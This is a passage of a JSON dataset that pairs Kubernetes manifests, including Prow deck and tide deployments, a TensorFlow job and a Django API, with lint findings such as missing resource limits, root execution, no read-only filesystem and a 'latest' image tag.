    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "3265",
    "manifest_path": "data/manifests/the_stack_sample/sample_1010.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20210902-02bdcbd6bf\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: metrics\n          containerPort: 9090\n        args:\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "3266",
    "manifest_path": "data/manifests/the_stack_sample/sample_1011.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/ynishi18/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goapp\" does not have a read-only root file system"
  },
  {
    "id": "3267",
    "manifest_path": "data/manifests/the_stack_sample/sample_1011.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/ynishi18/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goapp\" is not set to runAsNonRoot"
  },
  {
    "id": "3268",
    "manifest_path": "data/manifests/the_stack_sample/sample_1011.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/ynishi18/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"goapp\" has cpu request 0"
  },
  {
    "id": "3269",
    "manifest_path": "data/manifests/the_stack_sample/sample_1011.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/ynishi18/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"goapp\" has memory limit 0"
  },
  {
    "id": "3270",
    "manifest_path": "data/manifests/the_stack_sample/sample_1012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: module2-ex1\nspec:\n  template:\n    metadata:\n      name: module2-ex1\n    spec:\n      containers:\n      - name: tensorflow\n        image: nileshgule/tf-mnist:gpu\n        args:\n        - --max_steps\n        - '500'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n        volumeMounts:\n        - name: nvidia\n          mountPath: /usr/local/nvidia\n      volumes:\n      - name: nvidia\n        hostPath:\n          path: /usr/local/nvidia\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "3271",
    "manifest_path": "data/manifests/the_stack_sample/sample_1012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: module2-ex1\nspec:\n  template:\n    metadata:\n      name: module2-ex1\n    spec:\n      containers:\n      - name: tensorflow\n        image: nileshgule/tf-mnist:gpu\n        args:\n        - --max_steps\n        - '500'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n        volumeMounts:\n        - name: nvidia\n          mountPath: /usr/local/nvidia\n      volumes:\n      - name: nvidia\n        hostPath:\n          path: /usr/local/nvidia\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tensorflow\" does not have a read-only root file system"
  },
  {
    "id": "3272",
    "manifest_path": "data/manifests/the_stack_sample/sample_1012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: module2-ex1\nspec:\n  template:\n    metadata:\n      name: module2-ex1\n    spec:\n      containers:\n      - name: tensorflow\n        image: nileshgule/tf-mnist:gpu\n        args:\n        - --max_steps\n        - '500'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n        volumeMounts:\n        - name: nvidia\n          mountPath: /usr/local/nvidia\n      volumes:\n      - name: nvidia\n        hostPath:\n          path: /usr/local/nvidia\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tensorflow\" is not set to runAsNonRoot"
  },
  {
    "id": "3273",
    "manifest_path": "data/manifests/the_stack_sample/sample_1012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: module2-ex1\nspec:\n  template:\n    metadata:\n      name: module2-ex1\n    spec:\n      containers:\n      - name: tensorflow\n        image: nileshgule/tf-mnist:gpu\n        args:\n        - --max_steps\n        - '500'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n        volumeMounts:\n        - name: nvidia\n          mountPath: /usr/local/nvidia\n      volumes:\n      - name: nvidia\n        hostPath:\n          path: /usr/local/nvidia\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tensorflow\" has cpu request 0"
  },
  {
    "id": "3274",
    "manifest_path": "data/manifests/the_stack_sample/sample_1012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: module2-ex1\nspec:\n  template:\n    metadata:\n      name: module2-ex1\n    spec:\n      containers:\n      - name: tensorflow\n        image: nileshgule/tf-mnist:gpu\n        args:\n        - --max_steps\n        - '500'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n        volumeMounts:\n        - name: nvidia\n          mountPath: /usr/local/nvidia\n      volumes:\n      - name: nvidia\n        hostPath:\n          path: /usr/local/nvidia\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tensorflow\" has memory limit 0"
  },
  {
    "id": "3275",
    "manifest_path": "data/manifests/the_stack_sample/sample_1013.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220203-ad9c38e2b5\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-infra-prow-results/tide-history.json\n        - --status-path=gs://k8s-infra-prow-results/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: gcs-credentials\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-prow-sa-key\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "3276",
    "manifest_path": "data/manifests/the_stack_sample/sample_1013.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220203-ad9c38e2b5\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-infra-prow-results/tide-history.json\n        - --status-path=gs://k8s-infra-prow-results/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: gcs-credentials\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-prow-sa-key\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "3277",
    "manifest_path": "data/manifests/the_stack_sample/sample_1013.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220203-ad9c38e2b5\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-infra-prow-results/tide-history.json\n        - --status-path=gs://k8s-infra-prow-results/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: gcs-credentials\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-prow-sa-key\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "3278",
    "manifest_path": "data/manifests/the_stack_sample/sample_1013.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220203-ad9c38e2b5\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-infra-prow-results/tide-history.json\n        - --status-path=gs://k8s-infra-prow-results/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: gcs-credentials\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-prow-sa-key\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "3279",
    "manifest_path": "data/manifests/the_stack_sample/sample_1013.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20220203-ad9c38e2b5\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --gcs-credentials-file=/etc/gcs-credentials/service-account.json\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-infra-prow-results/tide-history.json\n        - --status-path=gs://k8s-infra-prow-results/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: gcs-credentials\n          mountPath: /etc/gcs-credentials\n          readOnly: true\n      volumes:\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: gcs-credentials\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-prow-sa-key\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "3280",
    "manifest_path": "data/manifests/the_stack_sample/sample_1014.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: howtos-api\n  namespace: howtos-prod\n  labels:\n    app: howtos-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: howtos-api\n  template:\n    metadata:\n      labels:\n        app: howtos-api\n    spec:\n      containers:\n      - image: registry.digitalocean.com/tiveritz/howtos-api:{{version}}\n        name: howtos-api\n        env:\n        - name: VERSION\n          value: '{{version}}'\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secret-key\n        - name: DEBUG\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: debug\n        - name: ALLOWED_HOSTS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: allowed-hosts\n        - name: SECURE_SSL_REDIRECT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secure-ssl-redirect\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-name\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-user\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-pass\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-port\n        - name: AWS_S3_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-access-key-id\n        - name: AWS_S3_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-secret-access-key\n        ports:\n        - containerPort: 8080\n          name: gunicorn\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"howtos-api\" does not have a read-only root file system"
  },
  {
    "id": "3281",
    "manifest_path": "data/manifests/the_stack_sample/sample_1014.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: howtos-api\n  namespace: howtos-prod\n  labels:\n    app: howtos-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: howtos-api\n  template:\n    metadata:\n      labels:\n        app: howtos-api\n    spec:\n      containers:\n      - image: registry.digitalocean.com/tiveritz/howtos-api:{{version}}\n        name: howtos-api\n        env:\n        - name: VERSION\n          value: '{{version}}'\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secret-key\n        - name: DEBUG\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: debug\n        - name: ALLOWED_HOSTS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: allowed-hosts\n        - name: SECURE_SSL_REDIRECT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secure-ssl-redirect\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-name\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-user\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-pass\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-port\n        - name: AWS_S3_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-access-key-id\n        - name: AWS_S3_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-secret-access-key\n        ports:\n        - containerPort: 8080\n          name: gunicorn\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"howtos-api\" is not set to runAsNonRoot"
  },
  {
    "id": "3282",
    "manifest_path": "data/manifests/the_stack_sample/sample_1014.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: howtos-api\n  namespace: howtos-prod\n  labels:\n    app: howtos-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: howtos-api\n  template:\n    metadata:\n      labels:\n        app: howtos-api\n    spec:\n      containers:\n      - image: registry.digitalocean.com/tiveritz/howtos-api:{{version}}\n        name: howtos-api\n        env:\n        - name: VERSION\n          value: '{{version}}'\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secret-key\n        - name: DEBUG\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: debug\n        - name: ALLOWED_HOSTS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: allowed-hosts\n        - name: SECURE_SSL_REDIRECT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secure-ssl-redirect\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-name\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-user\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-pass\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-port\n        - name: AWS_S3_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-access-key-id\n        - name: AWS_S3_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-secret-access-key\n        ports:\n        - containerPort: 8080\n          name: gunicorn\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"howtos-api\" has cpu request 0"
  },
  {
    "id": "3283",
    "manifest_path": "data/manifests/the_stack_sample/sample_1014.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: howtos-api\n  namespace: howtos-prod\n  labels:\n    app: howtos-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: howtos-api\n  template:\n    metadata:\n      labels:\n        app: howtos-api\n    spec:\n      containers:\n      - image: registry.digitalocean.com/tiveritz/howtos-api:{{version}}\n        name: howtos-api\n        env:\n        - name: VERSION\n          value: '{{version}}'\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secret-key\n        - name: DEBUG\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: debug\n        - name: ALLOWED_HOSTS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: allowed-hosts\n        - name: SECURE_SSL_REDIRECT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: secure-ssl-redirect\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-name\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-user\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-pass\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: db-port\n        - name: AWS_S3_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-access-key-id\n        - name: AWS_S3_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: howtos-api-env\n              key: aws-s3-secret-access-key\n        ports:\n        - containerPort: 8080\n          name: gunicorn\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"howtos-api\" has memory limit 0"
  },
  {
    "id": "3284",
    "manifest_path": "data/manifests/the_stack_sample/sample_1016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert -f docker-compose.prod.yaml\n    kompose.version: 1.21.0 ()\n  labels:\n    io.kompose.service: reporter\n  name: reporter\n  namespace: reporter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: reporter\n  template:\n    metadata:\n      annotations:\n        kompose.cmd: kompose convert -f docker-compose.prod.yaml\n        kompose.version: 1.21.0 ()\n      labels:\n        io.kompose.network/redis-net: 'true'\n        io.kompose.service: reporter\n    spec:\n      containers:\n      - env:\n        - name: GITHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: GITHUB_TOKEN\n              name: env\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_HOST\n              name: env\n        - name: REDIS_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PASSWORD\n              name: env\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: REDIS_PORT\n              name: env\n        - name: ZENHUB_TOKEN\n          valueFrom:\n            configMapKeyRef:\n              key: ZENHUB_TOKEN\n              name: env\n        image: docker.greymatter.io/internal/reporter:latest\n        imagePullPolicy: Always\n        name: reporter\n        ports:\n        - containerPort: 3000\n        resources: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reporter\" is using an invalid container image, \"docker.greymatter.io/internal/reporter:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3285",
    "manifest_path": "data/manifests/the_stack_sample/sample_1016.yaml",
